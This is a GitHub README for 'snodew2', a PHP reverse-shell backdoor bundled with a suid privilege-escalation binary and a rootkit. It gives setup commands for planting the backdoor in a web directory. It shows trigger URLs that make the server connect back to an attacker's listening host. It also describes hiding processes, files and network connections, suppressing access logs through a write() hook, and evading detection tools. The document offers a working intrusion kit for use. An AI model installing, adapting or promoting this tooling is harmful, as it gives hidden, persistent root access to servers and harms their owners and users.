
# snodew2
 * PHP reverse shell backdoor which uses a small suid binary to escalate privileges on connection.
 * new iteration of [snodew](https://github.com/mempodippy/snodew) but better.
 * snodew was previously designed to work alongside [vlany](https://github.com/mempodippy/vlany).
   * this is no longer the case as this version comes with its own specialised rootkit.
   * if you don't wish to have rootkit capabilities with snodew2, you can disable installation of the rootkit, so all that is setup is the backdoor itself.
   * but i would have to discourage doing that.

## usage
```
git clone https://github.com/naworkcaj/snodew2.git
cd snodew/
./setup.sh [install dir] [password]
```

### example usage
 * change SECRET_PORT to your own port of preference in `setup.sh` if you wish. if you don't, a random port number will be fetched
 * & you may need to change WWWNAME in `setup.sh` to match the target service user

```
./setup.sh /var/www/html/blog sexlovegod
(or without rootkit capabilities)
NO_ROOTKIT=1 ./setup.sh /var/www/html/blog sexlovegod
```
 * `setup.sh` will show you the name of snodew.php in the location you specified as the installation directory.
 * visit that in your browser. making sure you set your correct password.
   * for example, `http://lol.ok/blog/gjunmf.php?password=sexlovegod`
 * have something listening for a connection on the 'secret port' on the box of your choice.
   * `http://lol.ok/blog/gjunmf.php?password=sexlovegod&host=urbox`
   * congrats u have a shell

<b>result of successful installation:</b>
<img src="https://i.imgur.com/ujGtRGz.png">

<b>brief usage example upon visiting newly created php script:</b>
<img src="https://i.imgur.com/sDLprex.png">

<b>example reverse shell connection after giving script a target host:</b>
<img src="https://i.imgur.com/BSXy3Hg.png">

<b>using `./killself` in the backdoor shell:</b>
<img src="https://i.imgur.com/tkIrWRy.png">

## general notes
 * setup & installation of snodew is free of any dependencies.
   * excluding gcc and an available web service. and a brain i guess.
 * no encryption support??

## snodew.php & backdoor notes
 * is only a reverse shell. use a reverse shell handler.
 * trying to access snodew.php through a browser without having 'password' set & correct will display a 404 page.
   * NOT THE SERVER'S 404 PAGE. JUST A 404 PAGE.
 * suid executables can potentially be disabled on the box. most likely & usually not.
 * theoretically, snodew.php could be any kind of PHP file. you'd just have to rearrange some stuff.

## rootkit notes
 * all processes spawned for & by the rootkit are hidden.
   * in the original snodew, i had made a note of the fact that the initial spawning of the suid binary was visible in process listings.
     * this is no longer the case.
   * the original version also used extended attributes to hide regular files, i.e, not processes.
     * this too, is no longer the case. we only using a magic GID.

 * when the rootkit is installed, regular users can't see the PHP file, or the suid binary.
   * snodew determines when the service user can see the PHP file & the suid bin...
   * fundamental factors in deciding what makes the service user worthy of being able to see & access the two files are the following:
     * *you may need to change `WWWNAME` in setup.sh*
     * their UID & GID
     * their home directory
     * their environment variables
     * and their process name
 * during installation of the rootkit, you'll be given a magic variable.
   * you'll only need to use this in very special situations, most likely never. you'll know if or when you need to use it.

 * the rootkit's write() hook breaks write when buf contains the php filename.
   * this is in an effort to prevent access logs @ the php file.

## the rootkit does:
 * hide: backdoor connection information from netstat, ss, and all variants.
   * __only for connections on the secret port.__
 * hide: rootkit location from process maps files.
 * hide: obviously, files & processes spawned for or by the rootkit & snodew's backdoor.
 * evades discovery from various tools.
 * running `./killself` in a backdoor shell will remove the backdoor & rootkit from the box.